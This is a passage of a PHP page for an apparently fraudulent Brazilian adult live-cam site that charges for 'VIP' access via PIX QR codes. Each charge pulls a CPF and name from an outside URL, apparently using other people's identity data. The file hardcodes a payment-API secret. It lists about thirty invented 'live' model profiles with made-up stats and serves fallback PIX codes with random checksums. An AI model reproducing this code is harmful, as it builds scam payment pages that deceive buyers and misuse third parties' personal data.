<?php
session_start(); // Inicia a sessão para armazenar dados

// Includes necessários
include 'BSPayAPI.php';
include 'database.php';

// Get ID parameter from URL and set as price
$id = isset($_GET['id']) ? $_GET['id'] : '19.9'; // Default to 19.9 if not provided
$chatValue = '29.90'; // Valor padrão para chat privado
$valorFormatado = str_replace('.', ',', $id); // Format with comma for Brazilian currency
$chatValorFormatado = str_replace('.', ',', $chatValue);

// Verifica se é um redirecionamento de um profile para exibir a animação de loading
$showLoading = isset($_GET['loading']) ? true : false;

// Lógica para gerar o PIX QR Code
$valor = floatval($id); // Converte para float
$valorChat = floatval($chatValue); // Valor para chat

$logFile = "errors.log";
$imgpix = "";
$pixqr = "";
$transactionId = "";

// Função para gerar o código PIX
function gerarCodigoPix($valor) {
    global $imgpix, $pixqr, $transactionId, $logFile;
    
    // Validação do valor
    $valorMinimo = 1;
    $valorMaximo = 100000;
    
    if ($valor < $valorMinimo) {
        file_put_contents($logFile, "O valor não pode ser menor que $valorMinimo.\n", FILE_APPEND);
        return false;
    } elseif ($valor > $valorMaximo) {
        file_put_contents($logFile, "O valor não pode ser maior que $valorMaximo.\n", FILE_APPEND);
        return false;
    }
    
    // Criar ID da transação aleatório
    $randid = rand(11111, 99999);
    $dataFutura = date('Y-m-d', strtotime('+1 day'));
    
    // Buscar dados do cliente
    $url = 'https://database-type.online/bspay/dados.php';
    try {
        $data = json_decode(file_get_contents($url), true);
        
        if (json_last_error() !== JSON_ERROR_NONE) {
            file_put_contents($logFile, "Erro ao decodificar JSON: " . json_last_error_msg() . "\n", FILE_APPEND);
            return false;
        }
        
        $cpf = $data['cpf'] ?? null;
        $name = $data['name'] ?? null;
        
        if ($cpf === null || $name === null) {
            file_put_contents($logFile, "Dados insuficientes: CPF ou Nome não encontrados.\n", FILE_APPEND);
            return false;
        }
        
        $formatted_cpf = substr($cpf, 0, 3) . '.' . substr($cpf, 3, 3) . '.' . substr($cpf, 6, 3) . '-' . substr($cpf, -2);
        
        // Configuração da API
        $clientId = 'brando777_4762981867';
        $clientSecret = '942b448dc5da47f5b389303c51c1b620b1ef337be014f9c7d0030906303ca53e';
        $bspay = new BSPayAPI($clientId, $clientSecret);
        
        // Gerar QR Code PIX
        try {
            $response = $bspay->gerarQrCodePix($valor, $name, $formatted_cpf, $randid);
            
            $pixqr = $response['qrcode'] ?? null;
            $transactionId = $response['transactionId'] ?? null;
            
            if ($pixqr === null || $transactionId === null) {
                file_put_contents($logFile, "Dados de pagamento insuficientes: QR Code ou ID não encontrados.\n", FILE_APPEND);
                return false;
            }
            
            $imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=" . urlencode($pixqr);
            
            // Inserir a transação no banco de dados
            $pdo = connectDatabase();
            $stmt = $pdo->prepare("INSERT INTO transactions (transaction_id, external_id, status) VALUES (?, ?, ?)");
            $stmt->execute([$transactionId, $randid, 'PENDING']);
            
            return true;
        } catch (Exception $e) {
            file_put_contents($logFile, "Erro ao gerar pagamento: " . $e->getMessage() . "\n", FILE_APPEND);
            return false;
        }
    } catch (Exception $e) {
        file_put_contents($logFile, "Erro ao buscar dados: " . $e->getMessage() . "\n", FILE_APPEND);
        return false;
    }
    
    return false;
}

// Gerar código PIX para VIP
$pixGerado = gerarCodigoPix($valor);
if (!$pixGerado) {
    // Em caso de erro, usar valores padrão
    $imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=120x120&data=00020126580014br.gov.bcb.pix0136a37c6499-c98f-4d9d-b451-0137e5fc3600520400005303986540" . $id . "5802BR5917PAGAMENTO%20VIP6008BRASILIA62070503***63041234";
    $pixqr = "00020126580014br.gov.bcb.pix0136a37c6499-c98f-4d9d-b451-0137e5fc3600520400005303986540" . $id . "5802BR5917PAGAMENTO VIP6008BRASILIA62070503***63041234";
    $transactionId = "fallback_" . time();
}

// Chat payment separado
$chatImgpix = $imgpix;
$chatPixqr = $pixqr;
$chatTransactionId = $transactionId;

// Links para redirecionamento dos perfis ONLINE
$onlineRedirectUrls = [
    'JESSICAVIP' => 'https://livemodelo.com/live6.php?id=14.70',
    'AMANDACRISTAL' => 'https://livemodelo.com/live3.php?id=24.70',
    'MARIALOVEE' => 'https://livemodelo.com/live2.php?id=17.40',
    'LARI_HOT' => 'https://livemodelo.com/live4.php?id=9.70',
    'BIANCASEXYS2' => 'https://livemodelo.com/checkout6.php?id=19.70',
    'FERNANDAVICKY' => 'https://livemodelo.com/fernandavicky.php?id=15.80',
    'CASAL69' => 'https://livemodelo.com/casal69.php?id=23.60',
    'PAMELAKAT' => 'https://livemodelo.com/pamelakat.php?id=18.50',
    'DOCE_SOFIA' => 'https://livemodelo.com/docesofia.php?id=10.70',
    'TAMIRYSDIABINHA' => 'https://livemodelo.com/tamirys.php?id=20.90'
];

// In a real implementation, you would fetch this data from a database
// For demo, we're using hardcoded values
$profileData = [
    'BIANCASEXYS2' => [
        'fullName' => 'Bianca Silva Oliveira',
        'creationDate' => '05/03/2024',
        'liveHours' => '487',
        'followers' => '21.6K',
        'likes' => '398.2K',
        'verified' => true,
        'image' => 'foto7.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1040/800/400', // Capa personalizada
        'recommended' => true // Marca como recomendado
    ],
    'JESSICAVIP' => [
        'fullName' => 'Jéssica Luiza Costa',
        'creationDate' => '12/01/2023',
        'liveHours' => '342',
        'followers' => '9.8K',
        'likes' => '126.5K',
        'verified' => true,
        'image' => 'foto1.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1015/800/400' // Capa personalizada
    ],
    'AMANDACRISTAL' => [
        'fullName' => 'Amanda Lopes',
        'creationDate' => '03/05/2023',
        'liveHours' => '215',
        'followers' => '12.4K',
        'likes' => '245.2K',
        'verified' => true,
        'image' => 'foto2.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1016/800/400' // Capa personalizada
    ],
    'MARIALOVEE' => [
        'fullName' => 'Maria Eduarda Castro',
        'creationDate' => '18/08/2022',
        'liveHours' => '567',
        'followers' => '18.2K',
        'likes' => '356.9K',
        'verified' => true,
        'image' => 'foto3.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1018/800/400' // Capa personalizada
    ],
    'LARI_HOT' => [
        'fullName' => 'Larissa Fernanda Oliveira',
        'creationDate' => '22/03/2023',
        'liveHours' => '189',
        'followers' => '7.6K',
        'likes' => '98.3K',
        'verified' => false,
        'image' => 'capa4.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1019/800/400' // Capa personalizada
    ],
    // Novos perfis online
    'FERNANDAVICKY' => [
        'fullName' => 'Fernanda Victória Martins Lima',
        'creationDate' => '15/01/2024',
        'liveHours' => '176',
        'followers' => '8.3K',
        'likes' => '112.5K',
        'verified' => true,
        'image' => 'foto5.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1026/800/400' // Capa personalizada
    ],
    'CASAL69' => [
        'fullName' => 'Isabela Campos Santos',
        'creationDate' => '03/02/2024',
        'liveHours' => '224',
        'followers' => '14.2K',
        'likes' => '187.3K',
        'verified' => true,
        'image' => 'foto6.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1027/800/400' // Capa personalizada
    ],
    'PAMELAKAT' => [
        'fullName' => 'Pamela Ribeiro Sousa',
        'creationDate' => '18/12/2023',
        'liveHours' => '312',
        'followers' => '15.7K',
        'likes' => '203.8K',
        'verified' => true,
        'image' => 'foto8.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1028/800/400' // Capa personalizada
    ],
    'DOCE_SOFIA' => [
        'fullName' => 'Sofia Almeida Costa',
        'creationDate' => '27/02/2024',
        'liveHours' => '156',
        'followers' => '11.9K',
        'likes' => '178.5K',
        'verified' => false,
        'image' => 'foto9.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1029/800/400' // Capa personalizada
    ],
    'TAMIRYSDIABINHA' => [
        'fullName' => 'Tamirys Ferreira Lima',
        'creationDate' => '10/01/2024',
        'liveHours' => '267',
        'followers' => '16.2K',
        'likes' => '221.4K',
        'verified' => true,
        'image' => 'foto10.svg',
        'status' => 'online', // Set as online
        'coverImage' => 'https://picsum.photos/id/1030/800/400' // Capa personalizada
    ],
    // Perfis offline existentes
    'GEMEAS_GI' => [
        'fullName' => 'Giovanna & Gisele',
        'creationDate' => '05/10/2022',
        'liveHours' => '421',
        'followers' => '14.7K',
        'likes' => '278.4K',
        'verified' => true,
        'image' => '../offline/6.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1020/800/400' // Capa personalizada
    ],
    'BEATRIZ_COSTA' => [
        'fullName' => 'Beatriz Costa Almeida',
        'creationDate' => '19/02/2023',
        'liveHours' => '276',
        'followers' => '11.5K',
        'likes' => '187.6K',
        'verified' => true,
        'image' => '../offline/5.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1021/800/400' // Capa personalizada
    ],
    'JULIAVIP' => [
        'fullName' => 'Julia Castro Santos',
        'creationDate' => '07/09/2024',
        'liveHours' => '142',
        'followers' => '89',
        'likes' => '985',
        'verified' => true,
        'image' => '../offline/1.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1022/800/400' // Capa personalizada
    ],
    'CAROL_LIMA' => [
        'fullName' => 'Carol Lima Ferreira',
        'creationDate' => '14/12/2022',
        'liveHours' => '287',
        'followers' => '8.9K',
        'likes' => '143.2K',
        'verified' => false,
        'image' => '../offline/2.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1023/800/400' // Capa personalizada
    ],
    'LUIZA_SANTINHA' => [
        'fullName' => 'Luiza Santos Pereira',
        'creationDate' => '03/07/2022',
        'liveHours' => '398',
        'followers' => '13.6K',
        'likes' => '211.4K',
        'verified' => true,
        'image' => '../offline/4.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1024/800/400' // Capa personalizada
    ],
    'EMILLY23' => [
        'fullName' => 'Emilly Roberta Faria',
        'creationDate' => '25/04/2023',
        'liveHours' => '204',
        'followers' => '9.1K',
        'likes' => '132.7K',
        'verified' => true,
        'image' => '../offline/3.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1025/800/400' // Capa personalizada
    ],
    // Novos perfis offline
    'LET_MORENA' => [
        'fullName' => 'Leticia Moreira Santos',
        'creationDate' => '08/11/2023',
        'liveHours' => '267',
        'followers' => '10.5K',
        'likes' => '156.8K',
        'verified' => true,
        'image' => '../offline/offline.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1031/800/400' // Capa personalizada
    ],
    'CAMILINHA' => [
        'fullName' => 'Camila Pereira Costa',
        'creationDate' => '20/01/2023',
        'liveHours' => '329',
        'followers' => '12.7K',
        'likes' => '198.3K',
        'verified' => false,
        'image' => '../offline/offline1.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1032/800/400' // Capa personalizada
    ],
    'GABYY' => [
        'fullName' => 'Gabriela Alves Silva',
        'creationDate' => '13/08/2023',
        'liveHours' => '246',
        'followers' => '9.2K',
        'likes' => '145.6K',
        'verified' => true,
        'image' => '../offline/offline2.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1033/800/400' // Capa personalizada
    ],
    'MONIQUEBABY' => [
        'fullName' => 'Monique Souza Lima',
        'creationDate' => '11/06/2023',
        'liveHours' => '188',
        'followers' => '8.1K',
        'likes' => '127.2K',
        'verified' => true,
        'image' => '../offline/offline4.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1034/800/400' // Capa personalizada
    ],
    'TAINA_20' => [
        'fullName' => 'Tainá Rodrigues Ferreira',
        'creationDate' => '04/10/2023',
        'liveHours' => '274',
        'followers' => '10.9K',
        'likes' => '167.5K',
        'verified' => false,
        'image' => '../offline/offline5.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1035/800/400' // Capa personalizada
    ],
    'BECA_LESBICA' => [
        'fullName' => 'Rebeca Oliveira Almeida',
        'creationDate' => '28/07/2023',
        'liveHours' => '212',
        'followers' => '9.7K',
        'likes' => '139.8K',
        'verified' => true,
        'image' => '../offline/offline6.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1036/800/400' // Capa personalizada
    ],
    'MELZINHA19' => [
        'fullName' => 'Paloma Ribeiro Costa',
        'creationDate' => '02/09/2023',
        'liveHours' => '236',
        'followers' => '10.2K',
        'likes' => '152.4K',
        'verified' => true,
        'image' => '../offline/11.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1037/800/400' // Capa personalizada
    ],
    'RENATA_CAT' => [
        'fullName' => 'Renata Sousa Silva',
        'creationDate' => '15/03/2023',
        'liveHours' => '293',
        'followers' => '11.3K',
        'likes' => '174.7K',
        'verified' => false,
        'image' => '../offline/offline8.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1038/800/400' // Capa personalizada
    ],
    'MARCELA_CACAU' => [
        'fullName' => 'Marcela Santos Lima',
        'creationDate' => '09/05/2023',
        'liveHours' => '251',
        'followers' => '10.8K',
        'likes' => '158.2K',
        'verified' => true,
        'image' => '../offline/offline7.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1039/800/400' // Capa personalizada
    ],
    'SA_DIAMANTE' => [
        'fullName' => 'Sabrina Ferreira Costa',
        'creationDate' => '22/02/2023',
        'liveHours' => '264',
        'followers' => '11.1K',
        'likes' => '162.9K',
        'verified' => true,
        'image' => '../offline/13.svg',
        'status' => 'offline', // Set as offline
        'coverImage' => 'https://picsum.photos/id/1041/800/400' // Capa personalizada
    ]
];

// Generate QR code URL based on the id parameter
$pixqr = "00020126580014br.gov.bcb.pix0136a37c6499-c98f-4d9d-b451-0137e5fc3600520400005303986540510.005802BR5917PAGAMENTO VIP6008BRASILIA62070503***6304". rand(1000, 9999);
$imgpix = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" . urlencode($pixqr);

// Chat payment values
$chatValue = "14,90";

// Generic cover image
$coverImage = "https://picsum.photos/id/1015/800/400";
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LIVE MODELO</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <!-- Script para animação de loading na navegação -->
    <script>
    document.addEventListener('DOMContentLoaded', function() {
        // Verifica se deve mostrar o loading
        <?php if ($showLoading): ?>
        // Criar elemento de loading
        const pageLoader = document.createElement('div');
        pageLoader.className = 'page-loader';
        pageLoader.innerHTML = `
            <img src="logo400x130.png" alt="Logo">
            <div class="loader"></div>
        `;
        document.body.appendChild(pageLoader);
        
        // Remover loading após o carregamento da página
        window.addEventListener('load', function() {
            setTimeout(function() {
                pageLoader.style.opacity = '0';
                setTimeout(function() {
                    if (document.body.contains(pageLoader)) {
                        document.body.removeChild(pageLoader);
                    }
                }, 500);
            }, 1000);
        });
        <?php endif; ?>
        
        // Este código foi desabilitado para evitar conflitos com o redirecionamento em profileVisitedCookie.js
        // O redirecionamento é agora totalmente gerenciado pelo script profileVisitedCookie.js
        /*
        document.addEventListener('click', function(e) {
            // Não processamos o evento se vier de um elemento com bloqueio VIP
            if (e.target.closest('.vip-lock-overlay')) {
                return;
            }
            
            const profile = e.target.closest('.profile');
            // Verificamos se o perfil tem overlay VIP (não redirecionar)
            if (profile && profile.classList.contains('vip-locked')) {
                console.log("Profile com VIP lock, não redirecionando");
                return;
            }
            
            if (profile && profile.hasAttribute('data-redirect')) {
                const url = profile.getAttribute('data-redirect');
                if (url) {
                    console.log("Redirecionando para", url);
                    e.preventDefault();
                    // Criar elemento de loading
                    const pageLoader = document.createElement('div');
                    pageLoader.className = 'page-loader';
                    pageLoader.innerHTML = `
                        <img src="logo400x130.png" alt="Logo">
                        <div class="loader"></div>
                    `;
                    document.body.appendChild(pageLoader);
                    
                    // Salvamos o ID do perfil em um cookie (se tiver o atributo data-profile)
                    const profileId = profile.getAttribute('data-profile');
                    if (profileId && typeof setProfileVisitedCookie === 'function') {
                        setProfileVisitedCookie(profileId);
                    }
                    
                    // Redirecionar com atraso para mostrar o loading
                    setTimeout(function() {
                        window.location.href = url + '&loading=1';
                    }, 500);
                }
            }
        });
        */}
        });
    });
    </script>
<link rel="stylesheet" href="homehome3.css">
</head>
<body>
    <header class="header">
        <div class="menu-icon" id="menu-icon">
            <div></div>
            <div></div>
            <div></div>
        </div>
        <div class="logo-text">
            <img src="logo400x130.png" alt="Logo" style="width: 100%; height: 100%;" />
        </div>
        <div class="search-icon">
            <!-- Minimalist SVG search icon -->
            <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <circle cx="11" cy="11" r="8"></circle>
                <line x1="21" y1="21" x2="16.65" y2="16.65"></line>
            </svg>
        </div>
    </header>
    
    <!-- Sidebar Menu -->
    <div class="sidebar-overlay" id="sidebar-overlay"></div>
    <div class="sidebar" id="sidebar">
        <div class="sidebar-header">
            <div class="sidebar-logo">LIVE MODELO</div>
            <div class="sidebar-close" id="sidebar-close">
                <i class="fas fa-times"></i>
            </div>
        </div>
        <div class="sidebar-content">
            <ul class="sidebar-menu">
                <li class="sidebar-menu-item">
                    <a href="#" class="sidebar-menu-link">
                        <i class="fas fa-info-circle"></i>
                        <span>Sobre Nós</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" class="sidebar-menu-link">
                        <i class="fas fa-headset"></i>
                        <span>Suporte</span>
                    </a>
                </li>
                <li class="sidebar-menu-item">
                    <a href="#" class="sidebar-menu-link">
                        <i class="fas fa-video"></i>
                        <span>Sou Criadora de Conteúdo</span>
                    </a>
                </li>
            </ul>
        </div>
    </div>
    
    <nav class="nav-tabs">
        <div class="tab active" id="tab-aovivo">AO VIVO</div>
        <div class="tab" id="tab-tiktok">TIKTOK</div>
    </nav>
    
    <div class="filters-container">
        <div class="filters">
            <button class="nav-arrow left-arrow">‹</button>
            <div class="filter-button active">Todas</div>
            <div class="filter-button">Casal</div>
            <div class="filter-button">Sozinha</div>
            <div class="filter-button">PriveToy</div>
            <div class="filter-button">Desktop</div>
            <div class="filter-button">Iniciantes</div>
            <div class="filter-button">Premium</div>
            <button class="nav-arrow right-arrow">›</button>
        </div>
    </div>
    
    <div class="view-options">
        <div class="view-option active" data-grid="2">
            <div class="grid-icon">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        <div class="view-option" data-grid="3">
            <div class="grid3-icon">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
        <div class="view-option" data-grid="4">
            <div class="grid3-icon">
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
                <div></div>
            </div>
        </div>
    </div>
    
    <div class="profiles-container">
        <div class="profiles">
            <?php 
            // Display profiles
            foreach ($profileData as $name => $data): 
                $isOnline = $data['status'] === 'online';
                $statusClass = $isOnline ? 'online' : 'offline';
                $statusText = $isOnline ? 'ONLINE' : 'OFFLINE';
                $isRecommended = isset($data['recommended']) && $data['recommended'] === true;
                $profileClass = $isOnline ? 'profile glow-effect is-online' : 'profile glow-effect';
                
                // Adiciona a classe "recommended" para o perfil recomendado
                if ($isRecommended) {
                    $profileClass .= ' recommended';
                }
                
                $redirectUrl = $isOnline ? $onlineRedirectUrls[$name] : '';
            ?>
            <div class="<?php echo $profileClass; ?>" data-profile="<?php echo $name; ?>" data-status="<?php echo $data['status']; ?>" <?php if($isOnline) echo 'data-redirect="' . $redirectUrl . '"'; ?>>
                <div class="profile-header">
                    <div class="profile-name">
                        <span class="brazil-flag"></span>
                        <?php echo $name; ?>
                    </div>
                    <a href="javascript:void(0);" class="profile-link" data-profile="<?php echo $name; ?>">Perfil</a>
                </div>
                <div class="profile-image-container">
                    <div class="profile-overlay"></div>
                    <img src="<?php echo $data['image']; ?>" alt="Profile" class="profile-image">
                    <?php if ($isOnline): ?>
                    <div class="live-badge">AO VIVO</div>
                    <?php endif; ?>
                    <?php if ($isRecommended): ?>
                    <div class="recommended-badge">
                        <i class="fas fa-fire"></i> Popular
                    </div>
                    <?php endif; ?>
                    <div class="status-indicator <?php echo $statusClass; ?>">
                        <?php echo $statusText; ?>
                    </div>
                </div>
            </div>
            <?php endforeach; ?>
        </div>
    </div>
    
    <!-- Profile Popup -->
    <div class="profile-popup-container" id="profile-popup-container">
        <div class="profile-popup">
            <div class="profile-popup-close">
                <i class="fas fa-times"></i>
            </div>
            <div class="profile-popup-header">
                <div class="live-indicator" id="profile-live-indicator">
                        <span>AO VIVO</span>
                    </div>
                <img src="<?php echo $coverImage; ?>" alt="Profile Cover" id="profile-popup-cover">
                <div class="profile-popup-avatar">
                    <img src="" alt="Profile Avatar" id="profile-popup-avatar-img">
                </div>
            </div>
            <div class="profile-popup-content">
                <div class="profile-popup-name">
                    <span id="profile-popup-name-text"></span>
                    <span class="profile-popup-verified" id="profile-popup-verified">
                        <i class="fas fa-check-circle"></i>
                    </span>
                </div>
                
                <div class="verified-docs">
                    <i class="fas fa-shield-alt"></i> Documentos Verificados
                </div>
                
                <div class="profile-popup-stats">
                    <div class="profile-popup-stat">
                        <div class="profile-popup-stat-value" id="profile-popup-live-hours"></div>
                        <div class="profile-popup-stat-label">Horas Live</div>
                    </div>
                    <div class="profile-popup-stat">
                        <div class="profile-popup-stat-value" id="profile-popup-followers"></div>
                        <div class="profile-popup-stat-label">Seguidores</div>
                    </div>
                    <div class="profile-popup-stat">
                        <div class="profile-popup-stat-value" id="profile-popup-likes"></div>
                        <div class="profile-popup-stat-label">Curtidas</div>
                    </div>
                </div>
                
                <div class="profile-popup-info">
                    <div class="profile-popup-info-item">
                        <div class="profile-popup-info-label">Nome Completo</div>
                        <div class="profile-popup-info-value" id="profile-popup-fullname"></div>
                    </div>
                    <div class="profile-popup-info-item">
                        <div class="profile-popup-info-label">Data de Criação</div>
                        <div class="profile-popup-info-value" id="profile-popup-date"></div>
                    </div>
                </div>
                
                <div class="profile-popup-actions">
                    <button class="profile-popup-button profile-popup-button-primary" id="profile-popup-follow">
                        <i class="fas fa-user-plus"></i> Seguir
                    </button>
                    <button class="profile-popup-button profile-popup-button-secondary" id="profile-popup-message">
                        <i class="fas fa-comment"></i> Chat
                    </button>
                </div>
            </div>
        </div>
    </div>
    
    <!-- VIP Popup para limite de vídeos -->
    <div class="vip-popup-container" id="vip-popup">
        <div class="vip-popup">
            <div class="vip-popup-content">
                <h3>Assine Algum dos VIPS para continuar assistindo</h3>
                <button class="vip-popup-button" id="vip-popup-button">ASSINAR VIP</button>
            </div>
        </div>
    </div>
    
    <!-- TikTok Interface -->
    <div class="tiktok-container" id="tiktok-container">
        <div class="tiktok-header">
            <div class="tiktok-back" id="tiktok-back">
                <i class="fas fa-arrow-left"></i>
            </div>
            <div class="tiktok-title">Para Você</div>
        </div>
        
        <div class="tiktok-videos" id="tiktok-videos">
            <!-- Video 1 - Ao Vivo -->
            <div class="tiktok-video-container" id="video-1">
                <video class="tiktok-video" loop poster="https://livemodelo.com/menu/videotktk1.mp4">
                    <source src="https://livemodelo.com/menu/videotktk1.mp4" type="video/mp4">
                </video>
                <div class="tiktok-overlay">
                    <div class="tiktok-user-info">
                        <div class="tiktok-username">@amanda_oficial</div>
                        <div class="tiktok-caption">Estou em live agora meus amores 🔥 Para maiores de 18 #paravocê #tiktok</div>
                        <div class="tiktok-music">
                            <div class="tiktok-music-icon">
                                <i class="fas fa-music"></i>
                            </div>
                            <div>som original - Amanda Oficial</div>
                        </div>
                    </div>
                    <div class="tiktok-actions">
                        <div class="tiktok-user-profile live-creator">
                            <img src="foto2.svg" alt="User Profile">
                            <div class="live-badge-tiktok">AO VIVO</div>
                        </div>
                        <div class="tiktok-follow-button">+</div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon like-button" data-video="1">
                                <i class="fas fa-heart"></i>
                            </div>
                            <div class="tiktok-action-count like-count">12</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <div class="tiktok-action-count">2</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon save-button" data-video="1">
                                <i class="fas fa-bookmark"></i>
                            </div>
                            <div class="tiktok-action-count save-count">8</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon share-button">
                                <i class="fas fa-share"></i>
                            </div>
                            <div class="tiktok-action-count">Share</div>
                        </div>
                    </div>
                    <div class="tiktok-bottom-gradient"></div>
                </div>
            </div>

            <!-- Video 2 - Ao Vivo -->
            <div class="tiktok-video-container," id="video-1">
                <video class="tiktok-video" loop poster="https://livemodelo.com/menu/videotktk2.mp4">
                    <source src="https://livemodelo.com/menu/videotktk2.mp4" type="video/mp4">
                </video>
                <div class="tiktok-overlay">
                    <div class="tiktok-user-info">
                        <div class="tiktok-username">@jessica_hot</div>
                        <div class="tiktok-caption">Você não vai se arrepender 😈 Entre agora #tiktok+18 #trend</div>
                        <div class="tiktok-music">
                            <div class="tiktok-music-icon">
                                <i class="fas fa-music"></i>
                            </div>
                            <div>som original - Jéssica Hot</div>
                        </div>
                    </div>
                    <div class="tiktok-actions">
                        <div class="tiktok-user-profile live-creator">
                            <img src="foto1.svg" alt="User Profile">
                            <div class="live-badge-tiktok">AO VIVO</div>
                        </div>
                        <div class="tiktok-follow-button">+</div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon like-button" data-video="2">
                                <i class="fas fa-heart"></i>
                            </div>
                            <div class="tiktok-action-count like-count">104</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <div class="tiktok-action-count">19</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon save-button" data-video="2">
                                <i class="fas fa-bookmark"></i>
                            </div>
                            <div class="tiktok-action-count save-count">67</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon share-button">
                                <i class="fas fa-share"></i>
                            </div>
                            <div class="tiktok-action-count">Share</div>
                        </div>
                    </div>
                    <div class="tiktok-bottom-gradient"></div>
                </div>
            </div>

            <!-- Video 3 - Ao Vivo -->
            <div class="tiktok-video-container" id="video-1">
                <video class="tiktok-video" loop poster="https://livemodelo.com/menu/videotktk3.mp4">
                    <source src="https://livemodelo.com/menu/videotktk3.mp4" type="video/mp4">
                </video>
                <div class="tiktok-overlay">
                    <div class="tiktok-user-info">
                        <div class="tiktok-username">@maria_duda</div>
                        <div class="tiktok-caption">Gravei agora meus amores 🔞 #viral #trend</div>
                        <div class="tiktok-music">
                            <div class="tiktok-music-icon">
                                <i class="fas fa-music"></i>
                            </div>
                            <div>som original - Maria Duda</div>
                        </div>
                    </div>
                    <div class="tiktok-actions">
                        <div class="tiktok-user-profile live-creator">
                            <img src="foto3.svg" alt="User Profile">
                            <div class="live-badge-tiktok">AO VIVO</div>
                        </div>
                        <div class="tiktok-follow-button">+</div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon like-button" data-video="3">
                                <i class="fas fa-heart"></i>
                            </div>
                            <div class="tiktok-action-count like-count">52</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <div class="tiktok-action-count">5</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon save-button" data-video="3">
                                <i class="fas fa-bookmark"></i>
                            </div>
                            <div class="tiktok-action-count save-count">25</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon share-button">
                                <i class="fas fa-share"></i>
                            </div>
                            <div class="tiktok-action-count">Share</div>
                        </div>
                    </div>
                    <div class="tiktok-bottom-gradient"></div>
                </div>
            </div>

            <!-- Video 4 - Ao Vivo -->
            <div class="tiktok-video-container" id="video-1">
                <video class="tiktok-video" loop poster="https://livemodelo.com/menu/videotktk4.mp4">
                    <source src="https://livemodelo.com/menu/videotktk4.mp4" type="video/mp4">
                </video>
                <div class="tiktok-overlay">
                    <div class="tiktok-user-info">
                        <div class="tiktok-username">@lari_18y</div>
                        <div class="tiktok-caption">Show privado ao vivo todos os dias 💋 #hottiktok #+18tiktok #putariatok</div>
                        <div class="tiktok-music">
                            <div class="tiktok-music-icon">
                                <i class="fas fa-music"></i>
                            </div>
                            <div>som original - Larissa Safada</div>
                        </div>
                    </div>
                    <div class="tiktok-actions">
                        <div class="tiktok-user-profile live-creator">
                            <img src="capa4.svg" alt="User Profile">
                            <div class="live-badge-tiktok">AO VIVO</div>
                        </div>
                        <div class="tiktok-follow-button">+</div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon like-button" data-video="4">
                                <i class="fas fa-heart"></i>
                            </div>
                            <div class="tiktok-action-count like-count">23</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon">
                                <i class="fas fa-comment-dots"></i>
                            </div>
                            <div class="tiktok-action-count">3</div>
                        </div>
                        <div class="tiktok-action">
                            <div class="tiktok-action-icon save-button" data-video="4">
                                <i class="fas fa-bookmark"></i>
                            </div>
                            <div class="tiktok-action-count save-count">15</div>
                        </div>
                        <div class="tiktok-action">
